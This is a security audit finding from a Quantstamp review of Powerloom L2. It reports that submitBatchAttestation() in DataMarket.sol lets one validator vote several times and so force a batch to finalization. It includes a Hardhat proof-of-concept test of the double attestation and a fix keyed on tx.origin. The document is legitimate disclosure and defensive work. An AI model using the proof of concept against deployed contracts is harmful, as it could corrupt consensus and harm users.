---
tags:
  - lang/solidity
  - sector/governance
  - sector/infra
  - sector/staking
  - platform/quantstamp
  - severity/high
protocol: "[[Powerloom L2]]"
auditors:
  - Paul Clemson
report: "https://certificate.quantstamp.com/full/powerloom-l-2/695c4ca5-2bab-42f2-b41d-bff9eec03f32/index.html"
genome:
  - "[[bridge-validator-threshold]]"
  - "[[variant]]"
---
# Validators Can Submit Multiple Attestations to Maliciously Force Wrong Consensus

- id: 58812
- impact: HIGH
- protocol: Powerloom L2
- reporter: Paul Clemson (Quantstamp)
- source: https://certificate.quantstamp.com/full/powerloom-l-2/695c4ca5-2bab-42f2-b41d-bff9eec03f32/index.html

## Summary


The bug report is about a function called `submitBatchAttestation()` in the `DataMarket.sol` file. This function allows a validator to vote on a batch of data and provide a root hash. However, the function does not prevent a validator from voting multiple times on the same or different root hash in the same period. This means a single validator can manipulate the finalization of a batch by voting multiple times.

The report includes a proof of concept that shows how a validator can vote twice using a specific scenario. The recommendation is to use a mapping called `attestationsReceived` to prevent multiple voting. This can be implemented by adding a requirement that checks if the validator has already submitted an attestation for the given batch and root hash.

## Details

**File(s) affected:**`DataMarket.sol`

**Description:** The function `submitBatchAttestation()` allows a validator to vote on a given batchCid while providing a `finalizedCidsRootHash`. However, it does not guard against a validator voting again on either a different or the same hash in the same epoch.

This means a single validator can vote multiple times to force a batch to reach the finalization stage.

**Exploit Scenario:**

 This proof of concept shows that a validator can vote twice:

```
it("Testing Attestation Batch flow", async function () {
            const batchCid = "QmbWqxBEKC3P8tqsKc98xmWNzrzDtRLMiMPL8wBuTGsMnX";
            const batchId = 1;
            const projectIds = ["test-project-1", "test-project-2"];
            const snapshotCids = ["QmbWqxBEKC3P8tqsKc98xmWNzrzDtRLMiMPL8wBuTGsMnR", "QmbWqxBEKC3P8tqsKc98xmWNzrzDtRLMiMPL8wBuTGsMnS"];

            const finalizedRootHash = ethers.encodeBytes32String("test-hash");
            const epochId = currentEpoch.epochId;

            // set otherAccount1 as a sequencer
            const role = 1
            await proxyContract.updateAddresses(
                dataMarket1.target,
                role,
                [otherAccount1.address], 
                [true],
            );

            await expect(proxyContract.updateBatchSubmissionWindow(dataMarket1.target, 10)).to.not.be.reverted;

            const blockTimestamp = await time.latest();
            await expect(proxyContract.connect(otherAccount1).submitSubmissionBatch(
                dataMarket1.target, 
                batchCid,
                epochId, 
                projectIds, 
                snapshotCids, 
                finalizedRootHash
            )).to.emit(proxyContract, "SnapshotBatchSubmitted")
              .withArgs(dataMarket1.target, batchCid, epochId, blockTimestamp + 1);

            const project1Status = await proxyContract.snapshotStatus(dataMarket1.target, projectIds[0], epochId);
            const project2Status = await proxyContract.snapshotStatus(dataMarket1.target, projectIds[1], epochId);

            expect(project1Status.status).to.equal(0);
            expect(project2Status.status).to.equal(0);
            expect(project1Status.snapshotCid).to.equal(snapshotCids[0]);
            expect(project2Status.snapshotCid).to.equal(snapshotCids[1]);

            const role2 = 0

            await proxyContract.updateAddresses(
                dataMarket1.target,
                role2,
                [otherAccount1.address, otherAccount2.address, otherAccount3], 
                [true, true, true],
            );

            let otherHash = ethers.encodeBytes32String("test-hash1")
            let otherHash1 = ethers.encodeBytes32String("test-hash2")
            await proxyContract.connect(otherAccount1).submitBatchAttestation(dataMarket1.target, batchCid, epochId, finalizedRootHash)
            await proxyContract.connect(otherAccount1).submitBatchAttestation(dataMarket1.target, batchCid, epochId, finalizedRootHash)
        });
```

**Recommendation:** Make use of the `mapping attestationsReceived[batchCid][tx.origin]` to prevent multiple voting. This can look like this:

`require(!attestationsReceived[batchCid][tx.origin])`
